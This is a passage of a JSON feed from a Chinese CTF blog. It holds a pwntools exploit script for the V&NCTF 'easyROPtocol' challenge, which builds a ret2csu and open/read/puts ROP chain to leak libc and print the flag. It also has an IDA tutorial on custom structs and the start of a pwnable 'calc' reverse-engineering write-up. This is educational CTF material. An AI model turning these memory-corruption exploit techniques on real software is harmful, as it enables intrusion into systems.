punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Quit.'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># raw_input()</span>\n    se<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># raw_input()</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Which?'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">tcphead</span><span class=\"token punctuation\">(</span> offset <span class=\"token punctuation\">,</span> check <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0x766e</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0x28b7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span>check<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span> call_addr <span class=\"token punctuation\">,</span>rdi <span class=\"token punctuation\">,</span> rsi <span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    pop_rbx_r15_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x401BAA</span>\n    mov_call <span class=\"token operator\">=</span> <span class=\"token number\">0x401B90</span>\n    arg <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> \n        rdi <span class=\"token punctuation\">,</span> rsi <span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span>\n        call_addr<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> flat<span class=\"token punctuation\">(</span>pop_rbx_r15_ret <span class=\"token punctuation\">,</span> arg <span class=\"token punctuation\">,</span> mov_call<span class=\"token punctuation\">)</span> \n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    main <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000401A5E</span>\n    bss_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x404270</span>\n    free_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span>\n    write_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span>\n    read_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span>\n    ret <span class=\"token operator\">=</span> <span class=\"token number\">0x401BB4</span>\n\n    payload <span class=\"token operator\">=</span> tcphead<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4ad5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf80</span>\n\n    add<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">=</span> tcphead<span class=\"token punctuation\">(</span> <span class=\"token number\">0x1001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5ad5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf80</span>\n    add<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">=</span> tcphead<span class=\"token punctuation\">(</span> <span class=\"token number\">0x2001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6ad5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf80</span>\n    add<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n    payload <span class=\"token operator\">=</span> tcphead<span class=\"token punctuation\">(</span> <span class=\"token number\">0x3001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62fa</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x1a8</span> \n    payload <span class=\"token operator\">+=</span> csu<span class=\"token punctuation\">(</span>write_got <span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>write_got<span class=\"token punctuation\">,</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x38</span>\n    payload <span class=\"token operator\">+=</span> csu<span class=\"token punctuation\">(</span>read_got <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>bss_addr<span class=\"token punctuation\">,</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x38</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x000000000401A5E</span><span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># dbg()</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span>\n    se<span class=\"token punctuation\">(</span><span class=\"token string\">'flag\\x00'</span><span class=\"token punctuation\">)</span>\n\n    read_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span>\n    open_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span>\n    puts_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span>\n    pop_rax_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rax; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rsi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rsi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdx_pop_rbx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx ; pop rbx ; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ret <span class=\"token operator\">=</span> pop_rdi_ret <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n\n    flag_addr <span class=\"token operator\">=</span> bss_addr\n    chain <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rdx_pop_rbx_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> puts_addr\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># len chain 0x80</span>\n    check <span class=\"token operator\">=</span> <span class=\"token number\">0x7ad5</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>chain<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        check <span class=\"token operator\">^</span><span class=\"token operator\">=</span> u16<span class=\"token punctuation\">(</span>chain<span class=\"token punctuation\">[</span>i <span class=\"token punctuation\">:</span> i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>u16<span class=\"token punctuation\">(</span>chain<span class=\"token punctuation\">[</span>i <span class=\"token punctuation\">:</span> i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>check<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">=</span> tcphead<span class=\"token punctuation\">(</span> <span class=\"token number\">0x3001</span><span class=\"token punctuation\">,</span> check<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x1a8</span> \n    payload <span class=\"token operator\">+=</span> chain\n\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># dbg()</span>\n\n    <span class=\"token comment\"># # p.success(getShell())</span>\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   easyROPtocol.py\n@Time    :   2022/02/12 11:07:18\n@Author  :   Niyah \n'''</span></code></pre>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"问卷\"><a class=\"markdownIt-Anchor\" href=\"#问卷\">#</a> 问卷</h3>\n<p>钝角</p>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web</h2>\n<h3 id=\"gamev40\"><a class=\"markdownIt-Anchor\" href=\"#gamev40\">#</a> GameV4.0</h3>\n<p>游戏题 F12 开始翻，直接 flag 找到 base64 解出来</p>\n<p><img src=\"/CTF/V&NCTF-WriteUp-Niyah/image-20220212201936225-16448152971091.png\" alt=\"image-20220212201936225\"></p>\n",
            "tags": [
                "PWN",
                "堆",
                "栈"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/IDA%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%93%E6%9E%84%E4%BD%93/",
            "url": "http://niyah.cn/CTF/IDA%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%93%E6%9E%84%E4%BD%93/",
            "title": "IDA添加自定义结构体",
            "date_published": "2022-02-09T16:00:00.000Z",
            "content_html": "<blockquote>\n<p>IDA</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"ida添加自定义结构体\"><a class=\"markdownIt-Anchor\" href=\"#ida添加自定义结构体\">#</a> IDA 添加自定义结构体</h1>\n<p>在使用 IDA 进行程序分析的时候，通常改变简单数据类型也不能让程序变得可读性更好，这个时候我们就需要简单猜测并恢复一下结构体，让反编译出来的程序可读性更好</p>\n<p>在 IDA 选项卡里有这样一个 <code>Structures</code>  结构体选项卡存放了全局的结构体，我们可以在这里添加定义结构体</p>\n<p><img src=\"/CTF/IDA%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%93%E6%9E%84%E4%BD%93/image-20220210164026393.png\" alt=\"image-20220210164026393\"></p>\n<p>使用 <code>Insert</code>  插入一个结构体</p>\n<p><img src=\"/CTF/IDA%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%93%E6%9E%84%E4%BD%93/image-20220210164244940.png\" alt=\"image-20220210164244940\"></p>\n<p>在 ends 处按 <code>D</code>  可以添加数据结构，不断按  <code>D</code>  可以改变数据结构</p>\n<p><img src=\"/CTF/IDA%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%93%E6%9E%84%E4%BD%93/image-20220210164505161.png\" alt=\"image-20220210164505161\"></p>\n<p>在该变量处按  <code>A</code>  可以改变成字符串</p>\n<p><img src=\"/CTF/IDA%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%93%E6%9E%84%E4%BD%93/image-20220210164613364.png\" alt=\"image-20220210164613364\"></p>\n<p>如果要添加字符类型数组可以在某一个类型的变量处按  <code>小键盘*</code>  ，这样就会设置成该类型的数组</p>\n<p><img src=\"/CTF/IDA%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%93%E6%9E%84%E4%BD%93/image-20220210164839419.png\" alt=\"image-20220210164839419\"></p>\n<p>在设置好结构体之后就可以去程序里对符号按 <code>Y</code>  进行类型转化了</p>\n<p><img src=\"/CTF/IDA%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%93%E6%9E%84%E4%BD%93/image-20220210165347953.png\" alt=\"image-20220210165347953\"></p>\n",
            "tags": [
                "PWN",
                "IDA"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/pwnable%20calc%E9%A2%98%E8%A7%A3/",
            "url": "http://niyah.cn/CTF/pwnable%20calc%E9%A2%98%E8%A7%A3/",
            "title": "pwnable calc题解",
            "date_published": "2022-02-06T16:00:00.000Z",
            "content_html": "<p>这题真有意思</p>\n<a id=\"more\"></a>\n<h1 id=\"pwnable-calc题解\"><a class=\"markdownIt-Anchor\" href=\"#pwnable-calc题解\">#</a> pwnable calc 题解</h1>\n<p>对本程序实现了一个简单的计算器</p>\n<p>对本程序的逆向首先需要了解编译原理中的算符优先文法，在下面的函数中程序用了两个数组分别当成数栈 nums 和字符栈 signs，其中数栈有点特别，数栈的栈底即 nums [0] 存放了栈的长度即数的个数，在进行输入分析时会使用这两个栈</p>\n<p>parse_expr 函数</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">parse_expr</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>user_input<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>nums<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">int</span> idx<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>pointer<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+20h] [ebp-88h]</span>\n  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+24h] [ebp-84h]</span>\n  <span class=\"token keyword\">int</span> index<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+28h] [ebp-80h]</span>\n  <span class=\"token keyword\">int</span> offset<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+2Ch] [ebp-7Ch]</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>num_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+30h] [ebp-78h]</span>\n  <span class=\"token keyword\">int</span> num<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+34h] [ebp-74h]</span>\n  <span class=\"token keyword\">char</span> signs<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+38h] [ebp-70h] BYREF</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> canary<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+9Ch] [ebp-Ch]</span>\n\n  <span class=\"token comment\">// 和编译原理的算符优先文法类似</span>\n  <span class=\"token comment\">// 使用两个数组分别存放符号和数字，当遇到优先级高的符号则执行</span>\n  canary <span class=\"token operator\">=</span> <span class=\"token function\">__readgsdword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x14u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  pointer <span class=\"token operator\">=</span> user_input<span class=\"token punctuation\">;</span>\n  index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">bzero</span><span class=\"token punctuation\">(</span>signs<span class=\"token punctuation\">,</span> <span class=\"token number\">0x64u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token string\">'0'</span> <span class=\"token operator\">></span> <span class=\"token number\">9</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token comment\">// 当前为符号则进行下面操作，注意这个判断在结尾即字符等于\\x00时也会成立</span>\n      offset <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> pointer<span class=\"token punctuation\">;</span>\n      num_chunk <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>num_chunk<span class=\"token punctuation\">,</span> pointer<span class=\"token punctuation\">,</span> offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      num_chunk<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>num_chunk<span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prevent division by zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 只要数字是0就直接寄，无论加减乘除</span>\n      <span class=\"token punctuation\">&#125;</span>\n      num <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>num_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        idx <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>nums<span class=\"token punctuation\">)</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        nums<span class=\"token punctuation\">[</span>idx <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> num<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 这里可以看出，这个nums[0]存放的是数字个数,后面可以发现idx是可控的</span>\n      <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> user_input<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token string\">'0'</span> <span class=\"token operator\">></span> <span class=\"token number\">9</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"expression error!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 连着两个符号也寄</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      pointer <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>user_input<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> signs<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token 